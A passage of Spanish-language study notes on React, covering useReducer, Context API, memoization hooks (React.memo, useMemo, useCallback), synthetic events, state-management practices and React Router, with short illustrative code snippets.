  state.push(action.payload); // Mutación: MALA PRÁCTICA
  return state;
```

Lógica Compleja Fuera del Reducer (Idealmente):
El Reducer idealmente solo debe preocuparse por cómo transicionar de un estado a otro
Si necesitas hacer cálculos complejos o manejar la lógica de la API
hazlo en los manejadores de eventos o dentro de la función que llama a dispatch.

Ejemplo: generar un ID, hazlo antes de llamar a dispatch y pásalo en el payload.

```
// Componente
const handleAñadir = (texto) => {
  const nuevaTarea = { id: Date.now(), texto, completada: false }; // Lógica de ID aquí
  dispatch({ type: 'AÑADIR_TAREA', payload: nuevaTarea });
};

// Reducer (solo recibe el objeto y lo añade)
case 'AÑADIR_TAREA':
  return [...state, action.payload];
```

sub-reducers: Estados Complejos

useReducer para Lógica de Estado en useEffect

Inicialización Perezosa (Lazy Initialization
Reducers y Custom Hook



## Context API

##### Mecanismo que permite que los componentes compartan datos o estado
sin tener que pasarlos explícitamente a través de cada nivel del árbol de componentes
(prop drilling)

solución de React para la inyección de dependencias
y para la gestión de estado simple a mediano que necesita ser accesible globalmente o por muchos componentes.

Si tienes un dato (como la configuración del tema o la información de un usuario autenticado)
en la parte superior de tu aplicación y lo necesita un componente muy profundo
tienes que pasarlo como prop a través de cada componente intermedio, incluso si esos componentes intermedios no lo usan.

Context API
Permite que un componente en la cima "provea" el valor, y cualquier componente hijo
sin importar cuán profundo esté, puede "consumir" lo directamente.

1. React.createContext (Creación objeto context)

```
// userContext.js
import React from 'react';

// El valor pasado aquí ('null' o { username: 'Invitado' }) es el valor por defecto
// y solo se usa si un componente consumidor no tiene un Provider encima.
const UserContext = React.createContext(null); 

export default UserContext;
```

2. Provider (La Fuente)
Cada objeto Context viene con un componente Provider (UserContext.Provider).
Este es el componente que envuelve a la parte del árbol de la aplicación que necesita acceso a los datos.

Acepta una prop llamada value, que contiene los datos reales que se van a compartir.
Cuando el valor de esta prop cambia, todos los componentes que consumen este Context se vuelven a renderizar.

```
import UserContext from './userContext';
import { useState } from 'react';

function App() {
  const [usuario, setUsuario] = useState({ id: 1, nombre: 'Alice' });

  return (
    // Todos los componentes dentro de este Provider tendrán acceso a 'usuario'
    <UserContext.Provider value={usuario}>
      <ComponenteSuperior />
    </UserContext.Provider>
  );
}
```

3. Consumer (Receptor)

### Existen dos formas modernas de que un componente consuma el valor de Context: useContext (moderno), Consumer (clásico) 

1. useContext
forma más limpia y moderna de consumir el Context.

```
import React, { useContext } from 'react';
import UserContext from './userContext';

function ComponenteNieto() {
  // Engancha el Context y obtén el valor directamente
  const usuario = useContext(UserContext); 

  return <h2>Bienvenido, {usuario.nombre}</h2>;
}
```

2. Consumer Clásico 

sintaxis verbosa

```
// ...
function ComponenteNieto() {
  return (
    <UserContext.Consumer>
      {(usuario) => <h2>Bienvenido, {usuario.nombre} (Clásico)</h2>}
    </UserContext.Consumer>
  );
}
```

Uso Context API
Temas de UI (claro/oscuro).
Información de usuario autenticado y funciones de logout.
Configuración de idioma/localización.
##### Datos que rara vez cambian pero que se necesitan en muchos lugares.


Context API vs. Soluciones de Estado Global (Redux, Zustand)

Context API
Complejidad: Baja a media. Fácil de configurar.
Propósito: Inyección de dependencias y compartir datos que no cambian a menudo.
Rendimiento: Puede causar problemas de rendimiento si el value del Provider cambia con frecuencia, ya que todos los consumidores se vuelven a renderizar.

Usar Context API cuando solo necesitas evitar el prop drilling y la lógica de actualización del estado es simple.
Si tu estado es grande, con lógica de negocio compleja o asíncrona
considera combinarlo con useReducer o usar una librería dedicada como Redux.



## useContext

Permite a los componentes funcionales suscribirse y acceder al valor proporcionado por un Context Provider

Sintaxis: 
solo toma el objeto Context que creaste con React.createContext() como único argumento
devuelve el valor actual de ese Context.

```
import { useContext } from 'react';
import MiContexto from './MiContexto'; // El objeto creado con createContext()

function ComponenteHijo() {
  // El hook devuelve el valor que fue pasado al Provider
  const valorDelContexto = useContext(MiContexto); 
  
  // Ahora puedes usar el valor:
  return <h1>El tema actual es: {valorDelContexto.theme}</h1>;
}
```

Mecanismo de Suscripción

En useContext(MiContexto)
ComponenteHijo se suscribe automáticamente a los cambios en el Context.
React busca el Provider más cercano en el árbol que corresponda a ese MiContexto.
Si ese Provider cambia su prop value
React automáticamente vuelve a renderizar (dibuja de nuevo) el componente que usa useContext


Ej: Tema

1. Contexto 

```
// ThemeContext.js
import { createContext } from 'react';
export const ThemeContext = createContext(null);
```

2. Provider

```
// App.jsx
import { useState } from 'react';
import { ThemeContext } from './ThemeContext';
import BotonCambio from './BotonCambio';

function App() {
  const [theme, setTheme] = useState('light');
  const toggleTheme = () => setTheme(theme === 'light' ? 'dark' : 'light');

  return (
    // Provee el valor del tema y la función para cambiarlo
    <ThemeContext.Provider value={{ theme, toggleTheme }}>
      <header className={theme}>
        <h1>Mi Aplicación</h1>
        <BotonCambio /> 
      </header>
    </ThemeContext.Provider>
  );
}
```

3. consumir contexto (useContext)

```
// BotonCambio.jsx
import { useContext } from 'react';
import { ThemeContext } from './ThemeContext';

function BotonCambio() {
  // Aquí usamos el hook
  const { theme, toggleTheme } = useContext(ThemeContext); 

  return (
    <button onClick={toggleTheme}>
      Cambiar a {theme === 'light' ? 'Oscuro' : 'Claro'}
    </button>
  );
}
```

Cada vez que se llama a toggleTheme, el value del Provider cambia, y el BotonCambio
(y cualquier otro componente que use useContext(ThemeContext))
se vuelve a renderizar con el nuevo valor.


prácticas: 
Separa la Creación del Contexto y el Proveedor
MiContexto.js (La Definición)
MiProveedor.jsx (El Componente Lógico):
gestiona el estado (usando useState o useReducer) y lo pasa en la prop value.

Si el objeto pasado a la prop value del Provider cambia
React re-renderizará a todos los componentes que consumen ese Context
incluso si solo cambió una parte del objeto que no utilizan.

Usa useMemo para estabilizar el value:

```
const contextoValue = useMemo(() => ({ estado, setEstado }), [estado, setEstado]);

<MiContexto.Provider value={contextoValue}> 
  {children}
</MiContexto.Provider>
```

Crea un Custom Hook para Consumir el Contexto
Para limpiar la sintaxis de consumo y proporcionar manejo de errores
crea un Custom Hook para cada Context.

Posición del Provider en el Árbol
Contextos Globales: Los Providers que contienen datos globales (como el tema, el usuario) 
deben envolver el componente App en el nivel superior para que todos los componentes tengan acceso.
    
Contextos de Componente: Si un Context solo se necesita dentro de un módulo específico (ej. un wizard o formulario grande), envuelve solo ese módulo
minimiza el impacto en el rendimiento del resto de la aplicación.

Si necesitas múltiples Providers, puedes anidarlos:
```
<ThemeProvider>
  <AuthProvider>
    <MiApp />
  </AuthProvider>
</ThemeProvider>
```

o crear un componente Providers para limpiar la anidación:

```
// ...
<TodosLosProviders>
  <MiApp />
</TodosLosProviders>
```



## React.memo

Herramienta de optimización de rendimiento de React que se utiliza para componentes funcionales
Su propósito es evitar que un componente se vuelva a renderizar (dibujar) cuando sus props no han cambiado.

Es un concepto de "memorización" (de ahí el nombre memo) aplicado a nivel de componente.

React.memo es una función de orden superior (Higher-Order Component - HOC)
toma un componente funcional y le añade una lógica de optimización

Por defecto, cuando el componente padre de un componente funcional se renderiza
React también renderiza todos sus hijos, incluso si las props de esos hijos no han cambiado

Esto es normal y suele ser rápido pero en aplicaciones grandes o con listas muy extensas, este re-renderizado innecesario puede degradar el rendimiento.

React.memo envuelve el componente
renderizar este componente
compara las props nuevas con las props viejas
Si todas son iguales, salta la renderización y reutiliza el resultado del renderizado anterior."
Si las props son diferentes, entonces el componente se renderiza normalmente.

Sintaxis:
Simplemente envuelve tu componente funcional con React.memo:

```
import React from 'react';

// 1. Define tu componente normalmente
function ComponenteHijo({ nombre, edad }) {
  console.log('Componente Hijo Renderizado');
  return (
    <div>
      <p>Hola, me llamo {nombre} y tengo {edad} años.</p>
    </div>
  );
}

// 2. Exporta el componente envuelto en React.memo
export default React.memo(ComponenteHijo);
```


Comparación de Props (Shallow Comparison):
Por defecto, React.memo realiza una comparación superficial (shallow comparison) de las props
Para valores primitivos (strings, numbers, booleans): Compara los valores (ej: 5 === 5 o 'A' === 'B').
Para objetos y funciones (No primitivos): Compara las referencias de memoria (ej: objetoNuevo === objetoViejo).
Si el padre crea un nuevo objeto o función en cada renderizado
(aunque contengan los mismos datos)
la comparación superficial fallará y el componente hijo se renderizará

Prácticas
No lo Uses Universalmente
React.memo no siempre es una mejora. 
La comparación de props en sí misma consume tiempo. 

Solo úsalo cuando:
El componente se re-renderiza con frecuencia.
El componente recibe las mismas props la mayoría de las veces.
El componente es computacionalmente caro (tarda mucho en renderizarse).

##### En componentes sencillos, el costo de la comparación puede ser mayor que el costo de la renderización.


Estabiliza las Props No Primitivas:
##### Punto de conflito/errores: Si tu componente envuelto recibe objetos o funciones, debes estabilizarlos para que React.memo funcione correctamente.

Para Objetos/Arreglos: Usa el hook useMemo en el componente padre para estabilizar los objetos/arreglos pasados como props.

```
// En el componente padre
const datosUsuarioEstables = useMemo(() => ({
  email: user.email,
  id: user.id
}), [user.email, user.id]);

<ComponenteHijo datos={datosUsuarioEstables} />
```

Para Funciones: Usa el hook useCallback en el componente padre para estabilizar las funciones pasadas como props.

```
// En el componente padre
const handleClickEstable = useCallback(() => {
  // lógica
}, []); 

<ComponenteHijo onClick={handleClickEstable} />
```

##### Si no usas useCallback, cada vez que el padre se renderiza, crea una nueva instancia de la función lo que hace que la comparación en el hijo falle y el hijo se re-renderice innecesariamente.


Personaliza la Comparación (Tercer Argumento):

Si la comparación superficial no es suficiente, React.memo acepta un segundo (tercer en el orden de argumentos si cuentas el componente) argumento opcional: una función que define cómo comparar las props viejas y las nuevas
La función recibe (prevProps, nextProps) y debe devolver true si las props son iguales (y quieres saltar el renderizado) o false si son diferentes (y quieres que se renderice).

```
function sonPropsIguales(prevProps, nextProps) {
  // Retorna true si quieres SALTAR el renderizado
  // Retorna false si quieres FORZAR el renderizado
  return prevProps.edad === nextProps.edad && prevProps.nombre === nextProps.nombre;
}

export default React.memo(ComponenteHijo, sonPropsIguales);
```

##### React.memo es una herramienta poderosa, pero su efectividad depende de que uses los Hooks de memorización (useMemo y useCallback) en el componente padre para garantizar que


### React.memo vs useMemo

React.memo
Memoriza: Un Componente Funcional completo (el resultado de su renderizado).
Uso: evitar que un componente se re-renderice innecesariamente cuando sus props no han cambiado.
SintaxisEs una función de orden superior (HOC) que envuelve el componente.
Entrada	El componente que recibe props (y la lógica de comparación).

useMemo:
Valor Específico (el resultado de una función).
evitar re-calcular un valor costoso innecesariamente.
hook que se llama dentro de un componente funcional.
Una función de cálculo y un arreglo de dependencias



## useMemo

Herramienta fundamental de optimización.
Memorizar un valor para evitar que se recalcule innecesariamente en cada renderizado del componente.

useMemo toma dos argumentos
1. función de cálculo (factory function).
2. arreglo de dependencias (dependency array).

Cuando el componente se renderiza por primera vez, React ejecuta la función de cálculo
y almacena el valor resultante en la memoria (lo "memoriza").

En renderizados subsiguientes, React verifica los valores en el arreglo de dependencias:
Si ninguna de las dependencias ha cambiado
React devuelve el valor memorizado sin volver a ejecutar la función de cálculo.

Si alguna de las dependencias ha cambiado
React ejecuta la función de cálculo, devuelve el nuevo valor y lo memoriza para la próxima vez

##### Esto ahorra el costo de volver a realizar cálculos complejos o construir estructuras de datos grandes si la entrada (las dependencias) sigue siendo la misma.

Sintaxis:

##### El valor devuelto por useMemo es el valor de retorno de la función de cálculo.

```
const valorMemorizado = useMemo(() => {
  // Función de cálculo costosa
  return funcionCostosa(dep1, dep2);
}, [dep1, dep2]); // Arreglo de dependencias
```

##### Uso: relacionadas con la optimización de cálculos y la estabilización de referencias

1. Optimizar Cálculos Costosos
Función que realiza un cálculo que consume muchos recursos
y que solo necesita ejecutarse cuando ciertos datos cambian, useMemo es ideal.

```
function Listado({ items, filtro }) {
  // El filtrado solo se ejecuta si 'items' o 'filtro' cambian.
  const itemsFiltrados = useMemo(() => {
    console.log('Filtrando items...');
    return items.filter(item => item.nombre.includes(filtro));
  }, [items, filtro]); // Dependencias: Si cambian, se recalcula

  return (
    // ... Renderizado de itemsFiltrados
  );
}
```

2. Estabilizar Referencias (Objetos y Arreglos)
Uso vital para el rendimiento, especialmente cuando se trabaja con React.memo o con useEffect.
En JavaScript, los objetos y arreglos son tipos de referencia
Si creas un objeto {} o un arreglo directamente dentro del cuerpo de un componente
se crea una nueva referencia de memoria en cada renderizado, incluso si su contenido es idéntico.

##### Si pasas esta nueva referencia a un componente hijo optimizado con React.memo, la comparación de props fallará, forzando un re-renderizado innecesario. useMemo evita esto.

Problema:

```
// El objeto 'estilos' se crea de nuevo en cada renderizado del Padre
const estilos = { color: 'blue' }; 
<ComponenteMemoizado estilos={estilos} /> // Componente Memoizado se renderiza siempre
```

useMemo:

```
// El objeto 'estilosEstables' mantiene la misma referencia
const estilosEstables = useMemo(() => ({
  color: 'blue' 
}), []); // Array vacío: la referencia NUNCA cambia

<ComponenteMemoizado estilos={estilosEstables} /> // Componente Memoizado no se re-renderiza
```

Costos de useMemo:
Costo de la Comparación: Usar useMemo implica un costo de memoria y el costo de verificar las dependencias
Si el cálculo es trivialmente simple (ej. a + b), el costo de useMemo puede ser mayor que el costo de simplemente recalcular el valor.

Solo para Componentes Lentos: Resérvalo para valores que son costosos de calcular
##### o para estabilizar referencias que se pasan a componentes que tú sabes que son lentos o que están optimizados con React.memo



## useCallback

Herramienta de optimización diseñada para memorizar funciones.
##### Su objetivo es evitar que se creen nuevas instancias de funciones en cada renderizado
ayuda a prevenir re-renderizados innecesarios de componentes hijos.

useCallback toma dos argumentos
1. función callback
2. arreglo de dependencias (dependency array).

Cuando el componente se renderiza por primera vez, React ejecuta la función useCallback y almacena la referencia de la función resultante en la memoria (la "memoriza").

En renderizados subsiguientes, React verifica los valores en el arreglo de dependencias:
Si ninguna de las dependenciaSi alguna de las dependencias ha cambiado, React crea una nueva versión de la función, la devuelve y la memoriza para la próxima vez.s ha cambiado, React devuelve la misma referencia de la función que memorizó antes.

Problema: Estabilidad de Referencias
En JavaScript, las funciones son objetos
Si defines una función dentro del cuerpo de un componente funcional
esa función se re-crea completamente (obteniendo una nueva referencia de memoria) en cada renderizado

##### Si pasas esa función como prop a un componente hijo optimizado con React.memo
la comparación de props en el hijo siempre fallará porque la función es "nueva" cada vez
forzando al hijo a re-renderizarse innecesariamente

##### useCallback resuelve esto: garantiza que la función mantenga la misma referencia entre renderizados a menos que sus dependencias internas cambien.

```
const funcionMemorizada = useCallback(() => {
  // Lógica de la función
  console.log(`El contador actual es: ${contador}`); 
}, [contador]); // Arreglo de dependencias: La función solo cambia si 'contador' cambia
```

El uso principal de useCallback es para estabilizar las funciones que se pasan como props a componentes hijos que están envueltos en React.memo.

```
// Componente Hijo optimizado (solo se renderiza si sus props cambian)
const BotonMemorizado = React.memo(({ onClick, children }) => {
  console.log(`Renderizando Botón: ${children}`);
  return <button onClick={onClick}>{children}</button>;
});

function ComponentePadre() {
  const [contador, setContador] = useState(0);

  // Sin useCallback: La referencia de esta función cambia en cada renderizado del Padre
  // const handleClick = () => { setContador(c => c + 1); };

  // Con useCallback: La referencia de esta función es estable
  const handleClick = useCallback(() => {
    setContador(c => c + 1);
  }, []); // Dependencia: [] -> La referencia NUNCA cambia (es estable)

  return (
    <div>
      <p>Contador: {contador}</p>
      {/* Si handleClick fuera inestable, BotonMemorizado se renderizaría innecesariamente */}
      <BotonMemorizado onClick={handleClick}>Incrementar</BotonMemorizado> 
      <button onClick={() => setContador(c => c + 1)}>Renderizar Padre (sin usar prop)</button>
    </div>
  );
}
```

La función handleClick mantiene su referencia de memoria estable
Por lo tanto, BotonMemorizado (que usa React.memo) no se re-renderizará cuando cambie cualquier estado no relacionado en ComponentePadre.


### useMemo vs useCallback
useCallback: Memoriza la función en sí misma, dándote una referencia estable.
Estabilizar funciones para pasarlas a componentes hijos memorizados.

useMemo: Ejecuta la función y memoriza el valor devuelto por ella.
Estabilizar objetos/arreglos y optimizar cálculos costosos.


##### La memorización tiene un costo de tiempo de CPU y de memoria (el hook debe almacenar la función y comparar las dependencias).

Usa useCallback solo cuando sepas o sospeches que un componente hijo se está re-renderizando innecesariamente
y has determinado que la causa es una función que se pasa como prop.

Si tienes dudas, no lo uses.
React es extremadamente rápido, y la mayoría de los problemas de rendimiento provienen de componentes que renderizan grandes listas o realizan cálculos complejos
Enfócate primero en esos cuellos de botella.


### useCallback en Custom Hooks

Custom Hook que devuelve funciones (por ejemplo, useToggle, useContador), siempre envuelve esas funciones en useCallback
Razón: Garantizas que las funciones devueltas por tu Hook sean estables
Esto permite que los componentes que consumen tu Custom Hook puedan optimizar sus propios componentes hijos sin preocuparse por la inestabilidad.


## Estabilidad de Referencias

1. Prioriza el Valor sobre la Referencia: Siempre que uses un hook de memorización, pregúntate: "¿El cálculo es costoso?" o "¿Voy a pasar esta referencia a un componente memorizado?".
Si la respuesta es no, no uses la memorización.

2. No uses useMemo o useCallback para cada objeto o función. El hook tiene un costo de CPU y memoria (almacenar el valor y comparar las dependencias). 
Solo úsalo cuando hayas identificado un cuello de botella de rendimiento o una falla de optimización (un componente memoizado que se renderiza cuando no debería).


Cálculos Caros y Filtros
Cuando la función de cálculo dentro de useMemo es intensiva en recursos
ej. filtrado, clasificación, transformación de datos grandes)
La estabilidad asegura que el cálculo no se repita a menos que las dependencias cambien.

Escenario: Tienes un arreglo de 10,000 ítems y necesitas filtrarlo o clasificarlo antes de mostrarlo.
Recomendación: Envuelve la lógica de filtrado en useMemo.


### Custom Hooks y estabilidad

Si un Custom Hook devuelve objetos o funciones (lo más habitual), debe garantizar su estabilidad.
Escenario: Tu Custom Hook useForm devuelve un objeto { values, handlers } y funciones como handleSubmit.

Recomendación: Usa useMemo para el objeto de valores y useCallback para las funciones manejadoras (handleSubmit). 
Esto asegura que el Hook sea "consumible" de manera segura por componentes optimizados que lo utilicen.

Las recomendaciones se centran en cómo construir Custom Hooks que devuelvan valores estables para que los componentes que los consumen puedan optimizarse con React.memo.

Un Custom Hook puede ser una función sencilla que solo use useState y no devuelva ninguna función ni objeto complejo, en cuyo caso la estabilidad no es una preocupación crítica.

Sin embargo, en el contexto de las buenas prácticas y la optimización, se considera que deben ir juntos porque la estabilidad es lo que hace que los Custom Hooks sean realmente reusables y seguros para el rendimiento.


### Estabilidad Obligatoria

Escenario	Herramienta de Estabilidad Requerida

Devuelve Funciones	useCallback (Para handlers, toggle, submit, etc.)

Devuelve Objetos/Arreglos	useMemo (Para errors, config, objetos de state complejos)

Lógica Interna con Dependencias	useCallback / useMemo (Si una variable interna del hook se usa como dependencia en un useEffect o en otro hook memorizado).

Integración con useContext	useCallback (Para funciones de Context: login, logout)


Un Custom Hook simple que solo devuelve un valor primitivo (useMiHook que devuelve un string) no necesita estabilidad explícita
Sin embargo, cualquier Custom Hook que gestione lógica de aplicación real o que devuelva valores de referencia para ser consumidos por un árbol de componentes grande debe usar estabilidad para ser considerado una buena práctica y una herramienta robusta.




## Eventos sintéticos

Son un wrapper sobre los eventos nativos del navegador que aseguran un comportamiento consistente entre diferentes navegadores y sistemas.

eventos de ratón
onClick	Se dispara cuando el usuario hace clic con el ratón sobre un elemento.
onDoubleClick	Se dispara cuando el usuario hace doble clic sobre un elemento.
onMouseDown	Se dispara cuando se presiona un botón del ratón sobre un elemento.
onMouseUp	Se dispara cuando se suelta un botón del ratón sobre un elemento.
onMouseEnter	Se dispara cuando el cursor entra en el área de un elemento. No burbujea (a diferencia de onMouseOver).
onMouseLeave	Se dispara cuando el cursor sale del área de un elemento. No burbujea (a diferencia de onMouseOut).
onMouseMove	Se dispara cuando el cursor se mueve sobre un elemento.
onMouseOver	Se dispara cuando el cursor se mueve sobre un elemento o uno de sus descendientes. (Burbujea).
onMouseOut	Se dispara cuando el cursor sale de un elemento o se mueve hacia uno de sus descendientes. (Burbujea).
onContextMenu	Se dispara cuando el usuario intenta abrir el menú contextual (típicamente con el clic derecho).


Teclado
onKeyDown	Se dispara cuando se presiona una tecla.
onKeyPress	Obsoleto en React y en el estándar. Se usaba para teclas que producían un valor de carácter. (Mejor usar onKeyDown).
onKeyUp	Se dispara cuando se suelta una tecla.


Forms
onChange	Se dispara inmediatamente cuando el valor de un elemento de formulario (<input>, <select>, <textarea>) es modificado por el usuario.
onInput	Similar a onChange, pero se usa para detectar cuando el valor de un campo de entrada (<input>) ha sido modificado por el usuario. (React prefiere onChange).
onSubmit	Se dispara cuando un usuario intenta enviar un formulario (por ejemplo, al hacer clic en un botón de tipo submit).
onReset	Se dispara cuando un usuario hace clic en el botón de tipo reset de un formulario.
onFocus	Se dispara cuando un elemento recibe el foco (ej. haciendo clic o navegando con la tecla Tab).
onBlur	Se dispara cuando un elemento pierde el foco.
onInvalid	Se dispara cuando un campo de formulario no cumple con las restricciones de validación (ej. un campo requerido está vacío).


Foco
relacionados con onFocus y onBlur pero tienen un comportamiento diferente con respecto a la propagación del foco entre un padre y un hijo:

onFocusCapture	Captura el foco en la fase de captura (antes de que llegue al elemento objetivo).
onBlurCapture	Captura la pérdida de foco en la fase de captura


Portapapeles
onCopy	Se dispara cuando el usuario copia contenido al portapapeles.
onCut	Se dispara cuando el usuario corta contenido.
onPaste	Se dispara cuando el usuario pega contenido desde el portapapeles.


Medios
Utilizados principalmente en elementos de audio (<audio>) y video (<video>):
onPlay	Se dispara cuando el medio ha comenzado a reproducirse.
onPause	Se dispara cuando la reproducción del medio es pausada.
onEnded	Se dispara cuando la reproducción del medio termina.
onLoadedData	Se dispara cuando los datos de la fuente actual están cargados lo suficiente para que el medio comience a reproducirse.
onVolumeChange	Se dispara cuando el volumen o la propiedad muted del medio cambian.


Otros
onScroll	Se dispara cuando el usuario desplaza el contenido de un elemento.
onWheel	Se dispara cuando se utiliza la rueda del ratón sobre un elemento.
onDragStart	Se dispara cuando un elemento empieza a ser arrastrado (drag).
onDrop	Se dispara cuando un elemento arrastrado se suelta sobre una zona de destino.
onToggle	Se dispara cuando el estado abierto/cerrado del elemento nativo <details> cambia.
onLoad	Se dispara cuando un recurso (como una imagen o script) termina de cargar.
onError	Se dispara cuando un recurso falla al cargar (ej. una imagen con URL incorrecta).

## Actualización funcional

```
setEstado(valorPrevio => {
  // Retorna el nuevo valor basado en el valorPrevio
  return valorPrevio + 1; 
}); // Actualización funcional (o "callback")
```


## inmut

destruct: 

```
Objeto	Modificar propiedad	setObjeto(prev => ({ ...prev, claveNueva: valor }))
Array	Agregar elemento	setArray(prev => [...prev, nuevoElemento])
Array	Modificar elemento	setArray(prev => prev.map(item => (item.id === id ? {...item, cambio: valor} : item)))
```


## Estado global y local

El estado es cualquier dato que, cuando cambia, debe provocar que la interfaz de usuario se actualice

local:
estado que solo necesita un único componente o un pequeño grupo de componentes 
relacionados que pasan props entre sí. 
manejado principalmente con useState

global/compartido: 
estado al que acceden multiples componentes no relacionados entre si


Niveles de gestión de estado:

1. Básico (local)
Para la mayoría de los componentes, la gestión se realiza directamente en el componente.
useState: Para estados simples (números, strings, booleanos).
useReducer: Para estados complejos que tienen lógica de actualización complicada (transiciones de estado).
Elevación de Estado (Lifting State Up): Cuando varios componentes hermanos necesitan acceder al mismo estado
se mueve el estado al ancestro común más cercano y se pasa hacia abajo mediante props.

2. Intermedio (global nativo)
evitar prop drilling (pasar props por multiples componentes que no lo necesitan para llegar al componentes que si lo necesitan) 
con las soluciones nativas de react
Context API: Proporciona un mecanismo para compartir datos globales (como el tema o el usuario) 
a través del árbol de componentes sin pasar props manualmente.
Context + useReducer: El patrón avanzado donde se usa useReducer para centralizar la lógica de actualización del estado 
y luego se usa la Context API para distribuir ese estado y la función dispatch a todos los componentes que lo necesiten.

3. Avanzado (librerias)
Estado de UI/Global Complejo	Redux / Redux Toolkit	Un store central inmutable con Acciones y Reducers puros
Es ideal para aplicaciones con lógica de negocio muy estricta y trazabilidad.
UI Minimalista	Zustand	Un gestor de estado basado en hooks que es ligero
requiere mucho menos código repetitivo (boilerplate) que Redux.
Atómico	Recoil / Jotai	Trata el estado como unidades discretas (átomos) a las que los componentes se suscriben directamente, optimizando el rendimiento. 
Estado del Servidor	TanStack Query (React Query) / SWR	Se enfoca en gestionar el caché, la revalidación en foco, y la desduplicación de solicitudes de API, resolviendo los problemas comunes de useEffect


Prácticas para el estado local:

1. useState:
Estado Simple y Plano
Evita anidar objetos o arrays complejos, complica lógica de actualización
estado es complejo: usar useReducer o dividirlo en multiples useState
user actualización funcional
estado inmutable:  spread (...); ...prevItems, item

2. useReducer
lógica de transición compleja
Cambia de useState a useReducer: cuando tengamos multiples actualizaciones relacionadas
o cuando la lógica para determinar el siguiente estado se vuelve compleja.
Razón: useReducer centraliza toda la lógica de estado en la función reducer (SRP), 
manteniendo el componente libre de esa complejidad
Práctica: Usa useReducer cuando una sola acción (ej. hacer clic en "Enviar Formulario") 
necesita actualizar múltiples piezas de estado (isLoading, error, datos).
Esto se maneja limpiamente con una sola llamada a dispatch.

3. Arquitectura
evitar prop drilling:
eleva el estado más arriba en el árbol (al ancestro común)
o muévelo a la Context API si es global
State Colocation:
Mantén el estado tan cerca del componente que lo utiliza como sea posible. 
Abstraer Lógica con Custom Hooks:
componente con mucha lógica de negocio o ciclo de vida
Extrae esa lógica y su estado asociado a un Custom Hook
evitar re-renderizado:
useCallback y useMemo estratégicamente
useCallback para memorizar funciones callbacks
useMemo para memorizar valores de cómputo intensivo o referencias de objetos/arrays.
React.memo:
Si un componente de presentación se re-renderiza innecesariamente a menudo, envuélvelo en React.memo
Esto hace que React omita el re-renderizado si sus props no han cambiado.


Prácticas para el estado global:
datos compartidos por muchos componentes, a menudo distantes en el árbol
evita el "prop drilling" con context api o librerias

1. SRP
Nunca uses un único store o Contexto monolítico para toda la aplicación.
Razón: Si tienes un solo GlobalContext, cualquier cambio en cualquier parte de la aplicación (ej. el tema cambia) forzará el re-renderizado de todos los componentes suscritos
incluso si solo necesitan el estado de autenticación.
Solución: Crea múltiples Contextos o múltiples slices de Redux/Zustand
cada uno con una responsabilidad única (ej., AuthContext, ThemeContext, CartContext).

2. Diferencia el Estado del Servidor
Separa el estado que proviene de APIs (datos de usuario, listas de productos) 
del estado de la interfaz de usuario (el tema, las preferencias del usuario).
Utiliza librerías dedicadas a la gestión del Estado del Servidor (como TanStack Query o SWR).
Estas herramientas manejan de forma automática el caching, la revalidación y la desduplicación, aliviando la carga del Contexto o Redux.

context api nativo 

3. Usa Contexto para Datos Estables
ContextAPI es más adecuada para datos que no cambian con alta frecuencia (ej. usuario autenticado, configuración de idioma, tema).

4. contexto + useReducer
gestión de estado global complejo
useReducer para lógica actualización centralizada
Context API (para la distribución)
Reducer maneja la complejidad de la lógica
mientras que el Contexto solo se encarga de la distribución.

5. Optimiza el Consumo con Custom Hooks
Práctica: No llames a useContext(MiContexto) directamente en muchos lugares
Crea un Custom Hook que lance un error si el Contexto no está disponible.
Ejemplo: const useAuth = () => useContext(AuthContext);

6. librerías: Redux Toolkit (Redux Thunks, immer), Zustand, Recoil

7. Escalar: cantidad de componentes en la app por ej
Pequeña/Mediana: Context API + useReducer
Mediana/Grande con Estado de UI Simple: Zustand o Recoil (más sencillos de implementar que Redux).
Grande con Lógica Crítica: Redux Toolkit (si necesitas estricta trazabilidad y un gran ecosistema de herramientas).

8. Acciones Específicas: dispatch
las acciones deben describir qué sucedió (el evento)
no cómo debe cambiar el estado (la mutación).

Mal		SET_IS_LOADING_TRUE
Bien	USER_LOGIN_REQUESTED
Bien	FETCH_PRODUCTS_FAILED




## Routing

BrowserRouter, Routes, Route

Router (El Contenedor)
Rutas (<Route>): url + componente
Enlaces (<Link>: para links (a) y <NavLink>: mejora link, aplica estilo )

URL Params
información variable
useParams dentro del componente para leer id

useNavigate: cambiar la ruta después de una acción

useLocation: Devuelve el objeto de ubicación actual (URL, hash, query strings).
Se usa para rastrear la ubicación actual o para pasar el estado entre rutas.

useSearchParams: Devuelve un objeto para leer y modificar los parámetros de consulta (query strings, ej. ?orden=asc).
Ideal para filtros, búsqueda y paginación.

Flujo:
1. El usuario está en /acerca y hace clic en un <Link to="/contacto">
2. El navegador no recarga la página.
3. El BrowserRouter detecta el cambio de URL a /contacto (paso 1).
4. El componente <Routes> encuentra la <Route path="/contacto"> que coincide (paso 2).
5. React Router desmonta el componente Acerca y monta el componente Contacto en el lugar del layout donde se definió <Routes> (paso 3).
6. La UI se actualiza sin interrupción.

Rutas anidadas:
renderizar componentes dentro de otros componentes definidos por rutas
layouts y navegaciones más complejas y estructuradas
permiten que partes de la UI se carguen o cambien mientras el componente padre (el layout) permanece visible.
reflejan la jerarquía de la interfaz de usuario

Si el contenido de la Ruta B siempre se muestra dentro del componente de la Ruta A
entonces la Ruta B debe estar anidada bajo la Ruta A.

<Route>(padre:layout principal)<Outlet><Route>(hijas)

<Outlet> actúa como un marcador de posición.
Le dice al router dónde debe renderizar los componentes de las rutas hijas o anidadas.

Ruta Índice (index): Una ruta anidada que utiliza la prop index (en lugar de path) se renderiza cuando la URL coincide exactamente con la ruta padre (ej. solo /dashboard).
Es el contenido por defecto del <Outlet>

Rutas Relativas: Observa que las rutas hijas (resumen, ajustes) no comienzan con una barra inclinada (/).
Esto las hace relativas a la ruta padre (/dashboard), simplificando el mantenimiento.


Rutas protegidas:


Composición de Rutas:
combinas, anidas y estructuras los componentes de tus rutas para construir la ui

layout (la estructura visual) y la navegación con definiciones declarativas
anidando componentes

1. Rutas para Layouts: Las rutas superiores (padres) se utilizan para renderizar componentes de layout estáticos (ej. Header, Footer, Sidebar).

2. Rutas para Vistas: Las rutas anidadas (hijas) se utilizan para renderizar el contenido que cambia
el cual se inyecta en el layout padre a través del componente <Outlet>.

asegura que la jerarquía de tu URL
(/dashboard/ajustes)

refleje la jerarquía de componentes 
(<LayoutDashboard> contiene <Ajustes>).


La composición de rutas se manifiesta de tres formas principales en React Router:

1. Rutas de Layout con <Outlet> (Composición de Vista)
Forma más común y eficiente
Una ruta padre renderiza un componente que define el layout general
